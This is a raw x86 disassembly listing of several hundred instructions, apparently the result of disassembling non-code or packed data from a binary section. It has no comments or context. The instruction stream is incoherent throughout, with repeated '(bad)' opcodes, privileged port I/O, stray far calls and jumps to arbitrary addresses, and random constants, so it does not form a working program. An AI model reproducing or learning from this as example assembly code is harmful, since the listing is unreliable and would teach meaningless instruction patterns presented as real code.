  421081:	mov    ecx,0xce8562b1
  421086:	aam    0xc4
  421088:	pop    eax
  421089:	fs jb  0x4210e3
  42108c:	popa   
  42108d:	test   al,0x21
  42108f:	dec    esp
  421090:	inc    ebx
  421091:	popa   
  421092:	push   0x202b3820
  421097:	aas    
  421098:	ds mov ch,0xfa
  42109b:	jle    0x4210ff
  42109d:	out    0x9a,eax
  42109f:	add    al,0x2e
  4210a1:	pop    edx
  4210a2:	and    BYTE PTR [ebp-0x34],bl
  4210a5:	(bad)  
  4210a7:	test   ebp,ecx
  4210a9:	add    dh,BYTE PTR [edi-0x14]
  4210ac:	xchg   ebx,eax
  4210ad:	shl    dl,0x6c
  4210b0:	scas   eax,DWORD PTR es:[edi]
  4210b1:	loop   0x42104c
  4210b3:	adc    cl,bl
  4210b5:	sbb    eax,DWORD PTR ss:[ecx-0x69]
  4210b9:	cli    
  4210ba:	ins    DWORD PTR es:[edi],dx
  4210bb:	xchg   ebx,eax
  4210bc:	or     ch,dh
  4210be:	aaa    
  4210bf:	and    DWORD PTR [edx+0x5d],ecx
  4210c2:	add    BYTE PTR [esi],ch
  4210c4:	loopne 0x421077
  4210c6:	inc    edx
  4210c7:	mov    ecx,0xf28ac7a8
  4210cc:	add    DWORD PTR [esi-0x6e],esp
  4210cf:	rol    DWORD PTR [ebx-0x4fef67c],0xc4
  4210d6:	icebp  
  4210d7:	push   es
  4210d8:	cld    
  4210d9:	shr    ah,cl
  4210db:	jne    0x4210f1
  4210dd:	mov    ds:0x13f961cb,eax
  4210e2:	dec    eax
  4210e3:	scas   al,BYTE PTR es:[edi]
  4210e4:	xchg   ecx,eax
  4210e5:	into   
  4210e6:	mov    ecx,0xf932db19
  4210eb:	push   ss
  4210ec:	jle    0x421162
  4210ee:	xchg   ebp,eax
  4210ef:	sub    al,0xef
  4210f1:	mov    bh,0xe2
  4210f3:	push   edi
  4210f4:	in     al,dx
  4210f5:	test   BYTE PTR [ebx],dl
  4210f7:	mov    ch,0x54
  4210f9:	sub    BYTE PTR [edi-0x5e],dl
  4210fc:	pop    edx
  4210fd:	and    dl,BYTE PTR [ecx+0x6e99e981]
  421103:	stos   DWORD PTR es:[edi],eax
  421104:	(bad)
  421107:	neg    BYTE PTR [ecx-0x1753107e]
  42110d:	div    BYTE PTR [ebp+0x4cfa37ae]
  421113:	mov    ch,0x6
  421115:	push   ss
  421116:	push   eax
  421117:	and    bh,BYTE PTR [ebx+0x2489c936]
  42111d:	pusha  
  42111e:	push   ss
  42111f:	bound  esi,QWORD PTR [esp+ebp*4-0x6aa38c88]
  421126:	add    BYTE PTR [ebp+0x3152c138],cl
  42112c:	adc    cl,ch
  42112e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42112f:	or     esi,DWORD PTR [edi+0x2e6700a6]
  421135:	sub    eax,0x2427e776
  42113a:	and    eax,0x5450d462
  42113f:	ds adc eax,0x5ff16fe
  421145:	out    0xb4,eax
  421147:	mov    eax,ds:0x82076084
  42114c:	test   BYTE PTR [ebp-0x28],ah
  42114f:	jne    0x42114e
  421151:	jmp    0x47741f9e
  421156:	retf   0x928
  421159:	cmp    BYTE PTR [edi],cl
  42115b:	inc    ecx
  42115c:	test   DWORD PTR [esp+ebp*2+0x5f],eax
  421160:	pop    edx
  421161:	mov    ah,0x55
  421163:	mov    eax,ds:0xd12079e0
  421168:	dec    edi
  421169:	(bad)  
  42116a:	add    cl,BYTE PTR [edi]
  42116c:	lods   al,BYTE PTR ds:[esi]
  42116d:	xor    eax,0x39ec69b7
  421172:	jmp    0x42119f
  421174:	ficom  WORD PTR [eax+0x55]
  421177:	fs jo  0x421187
  42117a:	lds    edx,FWORD PTR [ecx]
  42117c:	dec    sp
  42117e:	add    al,0xdd
  421180:	and    al,0x3d
  421182:	pop    esp
  421183:	sub    al,0x8c
  421185:	pop    ebx
  421186:	dec    ebp
  421187:	dec    ebp
  421188:	popf   
  421189:	ror    cl,1
  42118b:	je     0x42112f
  42118d:	dec    ecx
  42118e:	cmc    
  42118f:	das    
  421190:	mov    esp,0xfcac6eb8
  421195:	dec    ecx
  421196:	iret   
  421197:	cmp    BYTE PTR [edi-0x6177d04f],ch
  42119d:	mov    dl,BYTE PTR [esi]
  42119f:	idiv   ecx
  4211a1:	iret   
  4211a2:	or     eax,0xbf6fda8d
  4211a7:	repnz cli 
  4211a9:	pop    ebp
  4211aa:	sbb    eax,0x66b20745
  4211af:	mov    esp,0xaba57255
  4211b4:	ficomp WORD PTR [ebx+0x4a84164d]
  4211ba:	pop    ds
  4211bb:	retf   0xcf1
  4211be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211bf:	mov    ecx,0xadf2d760
  4211c4:	and    bh,BYTE PTR [eax-0x58d22a23]
  4211ca:	mov    esp,0xdb3cd0f5
  4211cf:	outs   dx,BYTE PTR ds:[esi]
  4211d0:	inc    eax
  4211d1:	pop    edi
  4211d2:	sbb    eax,0x4a06d545
  4211d7:	mov    edi,0x48efd41b
  4211dc:	cdq    
  4211dd:	out    0xf3,eax
  4211df:	cmp    bl,BYTE PTR [ebp+0x50cf34e]
  4211e5:	jmp    0x50eb7f8c
  4211ea:	test   ah,bh
  4211ec:	out    0xeb,al
  4211ee:	jns    0x4211c1
  4211f0:	lock push esi
  4211f2:	ret    0xf83b
  4211f5:	jge    0x42118a
  4211f7:	sar    DWORD PTR [esi+0x47],0xd2
  4211fb:	pop    ebp
  4211fc:	dec    edx
  4211fd:	inc    edi
  4211fe:	fwait
  4211ff:	lock or bl,bl
  421202:	out    0xb4,eax
  421204:	jb     0x42124f
  421206:	(bad)  
  421207:	dec    esp
  421208:	inc    eax
  421209:	cmp    ecx,DWORD PTR [esi]
  42120b:	mov    esi,0x205644dd
  421210:	pop    ecx
  421211:	std    
  421212:	nop
  421213:	sub    eax,0xab40593a
  421218:	pop    ecx
  421219:	and    eax,0x8966ebcc
  42121e:	cs aas 
  421220:	aam    0x4e
  421222:	mov    eax,ds:0x30f2d0ae
  421227:	mov    eax,0xd1dade2b
  42122c:	stos   DWORD PTR es:[edi],eax
  42122d:	lds    ecx,FWORD PTR [ebx-0x4a80793b]
  421233:	pop    ebx
  421234:	in     eax,0x41
  421236:	daa    
  421237:	dec    edx
  421238:	and    BYTE PTR [ecx-0x61],bl
  42123b:	inc    eax
  42123c:	outs   dx,DWORD PTR ds:[esi]
  42123d:	in     al,dx
  42123e:	cmp    DWORD PTR [ebp+0x748d6bd7],0x2d80d08a
  421248:	inc    ecx
  421249:	jnp    0x421217
  42124b:	sub    al,BYTE PTR [esp+ebp*8]
  42124e:	jnp    0x421274
  421250:	int3   
  421251:	(bad)  
  421252:	out    0xd7,eax
  421254:	imul   edx,esi,0x9d1b3bcd
  42125a:	js     0x421231
  42125c:	xor    al,0xd0
  42125e:	add    BYTE PTR [edx+0x247da719],al
  421264:	sbb    DWORD PTR [eax-0x1f],eax
  421267:	xchg   BYTE PTR [esp+ebp*1],cl
  42126a:	popf   
  42126b:	pop    ebp
  42126c:	sub    eax,0x8b9d2823
  421271:	lahf   
  421272:	dec    ebx
  421273:	jnp    0x4212b4
  421275:	retf   
  421276:	and    dl,dl
  421278:	jnp    0x42126a
  42127a:	mov    dl,0xba
  42127c:	popa   
  42127d:	push   eax
  42127e:	pop    edx
  42127f:	and    ah,BYTE PTR [esi-0x18]
  421282:	push   ebx
  421283:	adc    BYTE PTR [eax+0x4bdcc282],al
  421289:	mov    DWORD PTR [eax-0x68],edx
  42128c:	xor    DWORD PTR [esp+edx*4],edi
  42128f:	jb     0x4212ba
  421291:	in     al,0xdb
  421293:	jg     0x4212b4
  421295:	retf   
  421296:	or     al,0xea
  421298:	or     eax,0x116a2ee2
  42129d:	or     DWORD PTR [ebp-0x63],edi
  4212a0:	out    dx,al
  4212a1:	shl    BYTE PTR [esi],cl
  4212a3:	sar    ebp,0x48
  4212a6:	sbb    al,0x9c
  4212a8:	dec    edi
  4212a9:	int    0xc6
  4212ab:	icebp  
  4212ac:	mov    WORD PTR [edx+0x30],?
  4212af:	sub    DWORD PTR [edi+0x55759272],ebp
  4212b5:	xor    al,0x1f
  4212b7:	test   BYTE PTR [edx+0x34],0x1f
  4212bb:	rcl    DWORD PTR [ecx+ecx*8],1
  4212be:	dec    ebp
  4212bf:	jns    0x4212b4
  4212c1:	dec    esi
  4212c2:	imul   esi,DWORD PTR [esi-0x336c4e46],0x15
  4212c9:	mov    bh,0xf9
  4212cb:	out    dx,al
  4212cc:	stc    
  4212cd:	dec    ebx
  4212ce:	hlt    
  4212cf:	sub    esi,DWORD PTR [edx]
  4212d1:	mov    eax,0x40c8c52e
  4212d6:	popa   
  4212d7:	ins    DWORD PTR es:[edi],dx
  4212d8:	in     al,0xf6
  4212da:	mov    ah,0x49
  4212dc:	xchg   edi,eax
  4212dd:	out    0x54,eax
  4212df:	push   edi
  4212e0:	mov    ebx,0xa1b86004
  4212e5:	add    DWORD PTR [ebx-0x70],edx
  4212e8:	loop   0x4212a7
  4212ea:	push   ebp
  4212eb:	adc    dh,ch
  4212ed:	call   0x72a2:0x34b3f607
  4212f4:	jl     0x421292
  4212f6:	mov    cs,WORD PTR [edx+0x7a]
  4212f9:	iret   
  4212fa:	iret   
  4212fb:	sti    
  4212fc:	fimul  WORD PTR [edx-0x27]
  4212ff:	clc    
  421300:	(bad)  [esi+eax*1]
  421303:	push   edi
  421304:	mov    DWORD PTR [edi+0x54],edx
  421307:	jge    0x4212c9
  421309:	mov    WORD PTR [ebx+0x52269758],ss
  42130f:	jl     0x421323
  421311:	leave  
  421312:	push   esp
  421313:	jae    0x4212de
  421315:	into   
  421316:	jb     0x4212ad
  421318:	(bad)  
  421319:	xchg   ebp,eax
  42131a:	fdiv   QWORD PTR [edi]
  42131c:	dec    edx
  42131d:	out    dx,al
  42131e:	pop    ebx
  42131f:	fwait
  421320:	in     al,dx
  421321:	dec    ebx
  421322:	(bad)  
  421323:	push   edx
  421324:	dec    esp
  421325:	adc    DWORD PTR [edx+0xc],0x789c87fa
  42132c:	and    esp,DWORD PTR [edi]
  42132e:	cld    
  42132f:	popf   
  421330:	retf   
  421331:	push   0xfffffff6
  421333:	ins    DWORD PTR es:[edi],dx
  421334:	add    esi,DWORD PTR ds:0xc4ce1265
  42133a:	test   DWORD PTR [ecx],esp
  42133c:	add    edi,eax
  42133e:	in     al,0xbe
  421340:	out    dx,eax
  421341:	adc    DWORD PTR [ecx],ecx
  421343:	sub    eax,0x7b0fe399
  421348:	in     al,0xc
  42134a:	ss sbb al,0x3d
  42134d:	mov    WORD PTR [edi-0x55fb71ad],es
  421353:	sbb    cl,al
  421355:	shl    cl,0x3b
  421358:	outs   dx,BYTE PTR ds:[esi]
  421359:	popf   
  42135a:	adc    ebx,DWORD PTR [ebx-0x2e383386]
  421360:	push   esi
  421361:	(bad)  
  421362:	call   0xea8d:0x51772a41
  421369:	sub    al,0x40
  42136c:	cs dec edi
  42136e:	cmp    esi,DWORD PTR [edx]
  421370:	and    BYTE PTR ds:0xa85a32e8,dl
  421376:	dec    eax
  421377:	and    DWORD PTR [eax-0x5cff8d9f],ebx
  42137d:	(bad)  
  42137e:	and    esi,ebx
  421380:	push   ds
  421381:	stc    
  421382:	xchg   ebp,eax
  421383:	dec    edi
  421384:	sub    eax,0xa80d9968
  421389:	adc    DWORD PTR [edx+0x26],ebx
  42138c:	sbb    esp,edi
  42138e:	sbb    DWORD PTR [ebx+0x38186b34],eax
  421394:	shl    BYTE PTR [edx-0xc],1
  421397:	scas   eax,DWORD PTR es:[edi]
  421398:	sar    edx,1
  42139a:	lods   al,BYTE PTR ds:[esi]
  42139b:	mov    ch,bh
  42139d:	inc    edx
  42139e:	loopne 0x421335
  4213a0:	xchg   ebp,eax
  4213a1:	xchg   ch,ch
  4213a3:	scas   eax,DWORD PTR es:[edi]
  4213a4:	loop   0x421416
  4213a6:	pop    edi
  4213a7:	mov    bl,0x29
  4213a9:	mov    DWORD PTR [ebx-0x47],edx
  4213ac:	xchg   edx,eax
  4213ad:	push   0x39ffd695
  4213b2:	fsub   DWORD PTR [edi]
  4213b4:	xlat   BYTE PTR ds:[ebx]
  4213b5:	adc    BYTE PTR [edx-0x1],dl
  4213b8:	jmp    0x7322396d
  4213bd:	ja     0x42143a
  4213bf:	jns    0x4213ad
  4213c1:	push   esp
  4213c2:	or     dl,BYTE PTR [eax+0x7e]
  4213c5:	icebp  
  4213c6:	or     BYTE PTR [ebx-0x6e],ah
  4213c9:	xchg   ebx,eax
  4213ca:	pop    ax
  4213cc:	ror    BYTE PTR [edx+edx*4],1
  4213cf:	sar    BYTE PTR [eax*8-0x159fae6e],cl
  4213d6:	outs   dx,DWORD PTR ds:[esi]
  4213d7:	fnstsw WORD PTR [esi+0x37e7f5f0]
  4213dd:	stos   DWORD PTR es:[edi],eax
  4213de:	fidiv  DWORD PTR gs:[ecx+edi*4]
  4213e2:	aas    
  4213e3:	add    edx,DWORD PTR [esi-0x5a6c0126]
  4213e9:	js     0x421450
  4213eb:	rcr    BYTE PTR [ebx],0x27
  4213ee:	cmp    eax,0x79a7dc7
  4213f3:	les    edi,FWORD PTR [eax-0x1df97e20]
  4213f9:	add    DWORD PTR [edx+0x183de12e],esi
  4213ff:	xchg   ecx,eax
  421400:	xlat   BYTE PTR ds:[ebx]
  421401:	iret   
  421402:	shl    bh,1
  421404:	call   0x6563:0xfaf6d5fe
  42140b:	jecxz  0x421457
  42140d:	retf   
  42140e:	xlat   BYTE PTR ds:[ebx]
  42140f:	retf   
  421410:	jg     0x4213cc
  421412:	mov    esp,0x7798099a
  421417:	test   DWORD PTR [ebx],ebp
  421419:	or     al,0xd3
  42141b:	mov    esi,0xb04fc3e6
  421420:	mov    dh,0x94
  421422:	lahf   
  421423:	mov    bl,0x10
  421425:	fild   QWORD PTR [ebx+ebx*2-0x1b5265d7]
  42142c:	sbb    dh,dh
  42142e:	mov    WORD PTR [esi-0x58],ds
  421431:	cmp    dl,dl
  421433:	ds sub ebp,ecx
  421436:	push   esi
  421437:	xchg   ecx,eax
  421438:	rol    DWORD PTR [edx+0x21],0x37
  42143c:	test   BYTE PTR [ecx-0x653577d1],dl
  421442:	fdivr  QWORD PTR [edi-0xa]
  421445:	inc    edx
  421446:	add    esi,0x35
  421449:	cwde   
  42144a:	loop   0x4213e9
  42144c:	cld    
  42144d:	xor    eax,DWORD PTR [edx-0x2]
  421450:	pop    ebx
  421451:	jecxz  0x421419
  421453:	mov    ebp,DWORD PTR [edi]
  421455:	jo     0x421401
  421457:	xor    cl,BYTE PTR [ecx-0x34f7e581]
  42145d:	push   ecx
  42145e:	test   dh,dl
  421460:	cmp    bh,BYTE PTR [edi-0x65]
  421463:	clc    
  421464:	jge    0x42145e
  421466:	pop    ebx
  421467:	mov    ecx,0x7d784c94
  42146c:	cmp    esp,edx
  42146e:	sbb    DWORD PTR [ebx+edi*1-0x26a44db1],edi
  421475:	add    BYTE PTR [ecx-0x26],al
  421478:	and    cl,BYTE PTR [ecx-0x4fa0d4fb]
  42147e:	mov    esi,0x49b41de8
  421483:	add    eax,0x6bc74810
  421488:	rcl    DWORD PTR [eax],0xea
  42148b:	add    al,al
  42148d:	stos   BYTE PTR es:[edi],al
  42148e:	ja     0x4214cb
  421490:	mov    dh,0x35
  421492:	cld    
  421493:	cmc    
  421494:	and    BYTE PTR [eax],al
  421496:	pop    es
  421497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421498:	scas   al,BYTE PTR es:[edi]
  421499:	jnp    0x42148d
  42149b:	int3   
  42149c:	(bad)  
  42149d:	repz and ebp,DWORD PTR [esi]
  4214a0:	mov    BYTE PTR [eax],0x27
  4214a3:	inc    edx
  4214a4:	pop    ebp
  4214a5:	pop    edx
  4214a6:	out    dx,eax
  4214a7:	stc    
  4214a8:	jns    0x42142c
  4214aa:	(bad)  [edx-0x104b4215]
  4214b0:	mov    eax,ds:0x92555fe7
  4214b5:	mov    gs:0x1acb76f8,al
  4214bb:	cmp    ch,BYTE PTR [esi+0x20b4cd11]
  4214c1:	push   0xfffffff4
  4214c3:	sub    ecx,DWORD PTR [edx-0x4390e493]
  4214c9:	shl    BYTE PTR [edx-0x71ea3728],cl
  4214cf:	ja     0x42154b
  4214d1:	gs jno 0x421525
  4214d4:	or     eax,0xe10034b1
  4214d9:	call   0xbcd34fa
  4214de:	in     eax,0xee
  4214e0:	xor    esp,eax
  4214e2:	aad    0x35
  4214e4:	push   edi
  4214e5:	fucomp st(7)
  4214e7:	and    DWORD PTR [ebp-0x3274a240],ecx
  4214ed:	cmp    cl,BYTE PTR [edx]
  4214ef:	in     al,dx
  4214f0:	icebp  
  4214f1:	and    eax,0xe9e91d05
  4214f6:	sbb    esp,DWORD PTR [ecx]
  4214f8:	sbb    al,0xc5
  4214fa:	je     0x42154b
  4214fc:	pop    ecx
  4214fd:	inc    eax
  4214fe:	pop    esi
  4214ff:	fwait
  421500:	mov    ebx,0xd35c85da
  421505:	shl    ah,0xaa
  421508:	clc    
  421509:	clc    
  42150a:	ret    
  42150b:	pop    edx
  42150c:	out    0xcf,al
  42150e:	(bad)  
  42150f:	enter  0x89f5,0x7f
  421513:	xor    DWORD PTR [ebp-0x2c],edi
  421516:	adc    dh,BYTE PTR [ebx-0x2998c3ad]
  42151c:	add    al,0xf
  42151e:	(bad)
  421521:	sub    esp,DWORD PTR [ecx-0x33]
  421524:	pop    eax
  421525:	hlt    
  421526:	fsubp  st(5),st
  421528:	mov    eax,ds:0xa27ce721
  42152d:	pop    eax
  42152e:	js     0x4214e1
  421530:	cmp    eax,0x2727015e
  421535:	xchg   ebp,eax
  421536:	loop   0x4214dd
  421538:	inc    ebp
  421539:	ins    DWORD PTR es:[edi],dx
  42153a:	mov    ch,0x19
  42153c:	pop    ebx
  42153d:	or     eax,0xc2d76a4c
  421542:	rcr    al,cl
  421544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421545:	into   
  421546:	pop    es
  421547:	pop    edx
  421548:	loopne 0x42158a
  42154a:	and    al,0x67
  42154c:	ret    
  42154d:	stos   DWORD PTR es:[edi],eax
  42154e:	or     ebp,DWORD PTR [ebx+0x79df0c8c]
  421554:	pop    ds
  421555:	fisttp WORD PTR ds:0x8605cc46
  42155b:	sub    al,0x93
  42155d:	mov    bh,0x17
  42155f:	xchg   BYTE PTR [ebx+0x4b014a5],ch
  421565:	cdq    
  421566:	call   0x939abd6f
  42156b:	jno    0x4214f5
  42156d:	push   esp
  42156e:	in     al,dx
  42156f:	add    BYTE PTR [ebx-0x6a],cl
  421572:	iret   
  421573:	push   cs
  421574:	mov    ds:0x75ecfc59,al
  421579:	push   es
  42157a:	cmc    
  42157b:	push   eax
  42157c:	lods   al,BYTE PTR ds:[esi]
  42157d:	out    dx,eax
  42157e:	jb     0x42151d
  421580:	dec    esp
  421581:	jne    0x4215a1
  421583:	ds fs push ds
  421586:	sub    eax,0x660fb4a2
  42158b:	test   ah,ch
  42158d:	jae    0x421606
  42158f:	jp     0x421511
  421591:	or     al,0x3d
  421593:	cmp    al,BYTE PTR [ebx+0x56e4b20d]
  421599:	lock mov ds:0xc80b00b3,eax
  42159f:	push   cs
  4215a0:	xchg   esi,eax
  4215a1:	test   edi,esi
  4215a3:	jl     0x4215c3
  4215a5:	adc    BYTE PTR [ecx-0x3af4696b],dl
  4215ab:	ret    0x3751
  4215ae:	ja     0x42158c
  4215b0:	jge    0x421616
  4215b2:	adc    ebx,DWORD PTR [esi+0x1e]
  4215b5:	jg     0x4215e4
  4215b7:	ds jge 0x4215e9
  4215ba:	aaa    
  4215bb:	arpl   WORD PTR [eax-0x1a],cx
  4215be:	push   ebx
  4215bf:	xor    al,0xfc
  4215c1:	jmp    0x645e4715
  4215c6:	jns    0x4215db
  4215c8:	jmp    0xa4c9fba1
  4215cd:	add    edi,esp
  4215cf:	(bad)  
  4215d0:	in     eax,dx
  4215d1:	jecxz  0x4215f8
  4215d3:	push   ebp
  4215d4:	fwait
  4215d5:	xchg   ebx,eax
  4215d6:	repz pop esi
  4215d8:	ror    DWORD PTR [edx+0x42],cl
  4215db:	mov    bl,0x75
  4215dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215de:	jmp    0xda8499e8
  4215e3:	push   esi
  4215e4:	jmp    FWORD PTR [edx]
  4215e6:	push   edi
  4215e7:	sar    bl,cl
  4215e9:	dec    ecx
  4215ea:	cmp    ecx,edx
  4215ec:	push   es
  4215ed:	lock mov dl,0x4
  4215f0:	pop    esp
  4215f1:	xchg   ch,ah
  4215f3:	dec    edx
  4215f4:	sbb    dh,BYTE PTR [edi-0x6950d49b]
  4215fa:	pop    ds
  4215fb:	mov    edx,0x3bb358e4
  421600:	mov    esp,0xa5841bba
  421605:	cli    
  421606:	xor    al,BYTE PTR ds:0xf9b655a7
  42160c:	pop    esi
  42160d:	jns    0x4215a1
  42160f:	aad    0x29
  421611:	lea    esp,[ebx-0x29fbac2b]
  421617:	cmp    bh,BYTE PTR [eax+edi*8]
  42161a:	push   0xffffffb5
  42161c:	sub    cl,BYTE PTR [edx-0x3062c311]
  421622:	loop   0x4215e2
  421624:	daa    
  421625:	addr16 jne 0x421695
  421628:	xor    al,0x93
  42162a:	shl    DWORD PTR [ecx-0x1151cc00],0x51
  421631:	fs aas 
  421633:	xor    ah,BYTE PTR [ecx+0x2c]
  421636:	(bad)  
  421637:	lods   eax,DWORD PTR ds:[esi]
  421638:	add    DWORD PTR [ebx],ecx
  42163a:	pop    ebp
  42163b:	mov    ds:0x23bfc350,al
  421640:	test   eax,0x52cb0756
  421645:	pop    edx
  421646:	cs mov cl,0xbc
  421649:	jae    0x421600
  42164b:	and    al,0xc5
  42164d:	xor    BYTE PTR [edx+0x19],al
  421650:	sti    
  421651:	mov    ds:0xac5f0e2b,eax
  421656:	and    eax,0x5e290de7
  42165b:	xchg   esp,eax
  42165c:	inc    edi
  42165d:	adc    ch,al
  42165f:	mov    eax,ds:0x67ad312d
  421664:	and    eax,0x4ae67064
  421669:	and    ebp,DWORD PTR [esp+ecx*2-0x65d6df13]
  421670:	(bad)  
  421671:	dec    edi
  421672:	ret    
  421673:	sahf   
  421674:	mov    ecx,0x6e14bd55
  421679:	xchg   ebx,eax
  42167a:	rcl    BYTE PTR [edi+ecx*1-0x54],0x6c
  42167f:	or     eax,DWORD PTR [ebx+0x30cf24dd]
  421685:	dec    ebx
  421686:	push   ds
  421687:	push   ebp
  421688:	push   ss
  421689:	adc    al,0x92
  42168b:	jns    0x421687
  42168d:	mov    fs:0x25153d07,al
  421693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421694:	or     al,0xa7
  421696:	jo     0x42168e
  421698:	push   edx
  421699:	ret    
  42169a:	push   ss
  42169b:	adc    al,BYTE PTR [esi-0x33f06d9c]
  4216a1:	and    dl,dl
  4216a3:	ficomp WORD PTR [edx-0x66]
  4216a6:	pop    es
  4216a7:	mov    ecx,0x8d3d9414
  4216ac:	iret   
  4216ad:	lods   al,BYTE PTR ds:[esi]
  4216ae:	clc    
  4216af:	push   0xffffffcd
  4216b1:	aam    0xe1
  4216b3:	daa    
  4216b4:	inc    eax
  4216b5:	arpl   WORD PTR [eax+ebx*2],di
  4216b8:	sub    bh,cl
  4216ba:	call   0x3305515d
  4216bf:	test   DWORD PTR [edi],edx
  4216c1:	fadd   DWORD PTR [edx+0x4ae1ab0d]
  4216c7:	pop    ss
  4216c8:	ins    BYTE PTR es:[edi],dx
  4216c9:	xlat   BYTE PTR ds:[ebx]
  4216ca:	mov    ebp,0xb4f93335
  4216cf:	push   esp
  4216d0:	inc    edx
  4216d1:	mov    ecx,0x461ea90a
  4216d6:	(bad)  
  4216d7:	int    0x51
  4216d9:	lods   eax,DWORD PTR ds:[esi]
  4216da:	loop   0x4216c0
  4216dc:	jmp    0x42173d
  4216de:	cli    
  4216df:	sbb    DWORD PTR [edi-0x1d],edi
  4216e2:	cli    
  4216e3:	cld    
  4216e4:	(bad)  
  4216e5:	fistp  WORD PTR [ecx+0x6e]
  4216e8:	push   ss
  4216e9:	inc    edi
  4216ea:	xor    esp,esi
  4216ec:	jge    0x42168a
  4216ee:	inc    DWORD PTR [ecx]
  4216f0:	mov    ecx,0x524915
  4216f5:	or     eax,0xc10e99ea
  4216fa:	cmp    BYTE PTR [eax-0x3f],ch
  4216fd:	call   0x7208:0xe9115ce1
  421704:	arpl   WORD PTR [esp+edx*8-0x1a73e517],sp
  42170b:	jae    0x4216cf
  42170d:	lods   al,BYTE PTR ds:[esi]
  42170e:	mov    DWORD PTR [eax-0x301aae32],esp
  421714:	push   eax
  421715:	mov    al,0x2c
  421717:	and    eax,0xc0fc10e
  42171c:	or     eax,0x31189fa5
  421721:	inc    esi
  421722:	dec    ebp
  421723:	mov    DWORD PTR [ecx+0x3bcccde1],esp
  421729:	pop    ebp
  42172a:	icebp  
  42172b:	loope  0x421783
  42172d:	mov    ebx,gs
  42172f:	aas    
  421730:	or     ecx,edx
  421732:	int3   
  421733:	loop   0x4216f2
  421735:	mov    eax,0x9785c803
  42173a:	je     0x421713
  42173c:	jge    0x4217b5
  42173e:	outs   dx,BYTE PTR ds:[esi]
  42173f:	sub    eax,0xf6a3b00f
  421744:	mov    cl,0x3f
  421746:	dec    esp
  421747:	nop
  421748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421749:	dec    ebp
  42174a:	int    0x1a
  42174c:	test   al,0x5c
  42174e:	rcl    BYTE PTR [eax+0x2f8f8c28],1
  421754:	cmp    esp,DWORD PTR [edi]
  421756:	lods   eax,DWORD PTR ds:[esi]
  421757:	in     al,0x87
  421759:	adc    DWORD PTR [eax],edx
  42175b:	xlat   BYTE PTR ds:[ebx]
  42175c:	inc    ebp
  42175d:	ret    0xb20a
  421760:	or     DWORD PTR [ebx+0x76],0xd20830eb
  421767:	mov    edi,0x2344808b
  42176c:	lahf   
  42176d:	cld    
  42176e:	sbb    BYTE PTR [eax+ebx*1-0x55],0x6a
  421773:	imul   BYTE PTR [edi]
  421775:	add    esi,DWORD PTR [eax-0x47]
  421778:	inc    esp
  421779:	ret    
  42177a:	js     0x421720
  42177c:	iret   
  42177d:	test   DWORD PTR [eax+0x41],esi
  421780:	sub    edx,DWORD PTR [edi-0x5f]
  421783:	and    dh,0x7b
  421786:	loope  0x4217d8
  421788:	add    BYTE PTR [eax+0x11],al
  42178b:	(bad)  
  42178c:	pushf  
  42178d:	xor    esp,DWORD PTR [ebx]
  42178f:	loopne 0x421757
  421791:	mov    cl,0x51
  421793:	ret    0xb61e
  421796:	leave  
  421797:	scas   al,BYTE PTR es:[edi]
  421798:	cmp    eax,0xc9b8a34b
  42179d:	es sbb al,0xb9
  4217a0:	inc    esp
  4217a1:	stos   BYTE PTR es:[edi],al
  4217a2:	call   0x7735:0x17ec6b00
  4217a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217aa:	rol    DWORD PTR [ebx+0x1c66c734],1
  4217b0:	xchg   edi,eax
  4217b1:	xchg   esi,eax
  4217b2:	jmp    0x51c4c3db
  4217b7:	xchg   ecx,eax
  4217b8:	mov    edx,0xe84cdc48
  4217bd:	nop
  4217be:	sti    
  4217bf:	into   
  4217c0:	mov    dh,BYTE PTR [ecx+0x2b2d9622]
  4217c6:	add    al,0x6f
  4217c8:	shl    BYTE PTR [edi+0x4aaa7dd4],cl
  4217ce:	add    BYTE PTR [ecx],bl
  4217d0:	mov    esi,ebx
  4217d2:	mov    eax,0x537fdd72
  4217d7:	ins    BYTE PTR es:[edi],dx
  4217d8:	push   ebp
  4217d9:	sahf   
  4217da:	inc    ecx
  4217db:	retf   0xacc9
  4217de:	and    DWORD PTR [edx],ecx
  4217e0:	push   0xd8c36eff
  4217e5:	mov    ecx,0xc8bb5de0
  4217ea:	inc    ebp
  4217eb:	out    dx,al
  4217ec:	shr    dh,cl
  4217ee:	mov    ds:0xa0652498,eax
  4217f3:	dec    eax
  4217f4:	js     0x421868
  4217f6:	pushf  
  4217f7:	or     bl,BYTE PTR [ecx+0x7f]
  4217fa:	sbb    ebp,edi
  4217fc:	adc    eax,0x4ce4a63d
  421801:	fucomip st,st(1)
  421803:	jge    0x4217df
  421805:	outs   dx,DWORD PTR ds:[esi]
  421806:	pusha  
  421807:	sahf   
  421808:	or     bl,BYTE PTR [edi+0x7294fb88]
  42180e:	mov    dh,al
  421810:	stc    
  421811:	loope  0x421836
  421813:	fistp  WORD PTR [ebp-0x420cbb9f]
  421819:	sub    dl,BYTE PTR [esi+ecx*8-0x45]
  42181d:	sbb    al,0xe4
  42181f:	clc    
  421820:	shl    BYTE PTR [edx+0x7b45af75],0x4
  421827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421828:	sbb    al,0x89
  42182a:	(bad)  
  42182b:	and    al,0x74
  42182d:	dec    esp
  42182e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42182f:	mov    esp,0x603efb08
  421834:	bound  ebx,QWORD PTR [edx+0x66]
  421837:	push   eax
  421838:	or     al,0x6e
  42183a:	stos   BYTE PTR es:[edi],al
  42183b:	mov    edi,0x16e8876f
  421840:	pop    ebp
  421841:	aam    0x67
  421843:	cmp    BYTE PTR [edx],ah
  421845:	adc    ah,BYTE PTR [ebp+0x6a8f6203]
  42184b:	arpl   sp,di
  42184d:	sbb    eax,0x4a5ff6cf
  421852:	mov    ds:0xac050f8b,eax
  421857:	dec    esi
  421858:	mov    edi,0xc0ccf750
  42185d:	jo     0x421870
  42185f:	test   eax,0xc26e117e
  421864:	rcr    BYTE PTR [edx+edi*8],0xc6
  421868:	sub    ch,bh
  42186a:	dec    edi
  42186b:	pop    ss
